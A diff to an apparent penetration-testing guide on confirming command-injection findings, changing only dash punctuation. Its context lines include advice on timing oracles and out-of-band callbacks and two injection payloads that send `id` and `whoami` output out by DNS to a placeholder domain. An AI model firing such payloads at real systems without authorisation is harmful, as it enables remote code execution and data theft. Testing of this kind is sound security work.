@@ -547,7 +547,7 @@ Before classifying a finding, verify:
 - Is the response derived from the executed command (output, timing) or could it
   be a static error / WAF block message?
 - For timing oracles: is the delta both REPRODUCIBLE and clearly above the target's
-  OWN measured jitter? Measure baseline variance first — a few hundred ms can be pure
+  OWN measured jitter? Measure baseline variance first -- a few hundred ms can be pure
   noise on a slow/proxied target, while a `sleep 5` should stand out far beyond it.
   Judge against the observed noise floor, not a fixed cutoff, and prefer a longer sleep
   to separate signal from jitter when the margin is tight.
@@ -663,12 +663,12 @@ random subdomains will NOT route back.
 
 > `oast.fun` is the DEFAULT public interactsh server. If the project configured a
 > different OOB provider or a self-hosted interactsh, pass that host to `-server`
-> instead. Against an egress-restricted target no callback arrives — treat that as
+> instead. Against an egress-restricted target no callback arrives -- treat that as
 > INCONCLUSIVE, not proof the vector is dead.
 
 ### Step 3: Inject OOB payloads pointing at REGISTERED_DOMAIN
 
-**Unix DNS exfil (works ONLY where the target can make outbound DNS queries — egress-filtered / air-gapped / no-resolver targets never call back, so silence here is INCONCLUSIVE, not proof of no RCE):**
+**Unix DNS exfil (works ONLY where the target can make outbound DNS queries -- egress-filtered / air-gapped / no-resolver targets never call back, so silence here is INCONCLUSIVE, not proof of no RCE):**
 ```
 ;nslookup `id`.REGISTERED_DOMAIN
 ;dig +short `whoami`.REGISTERED_DOMAIN
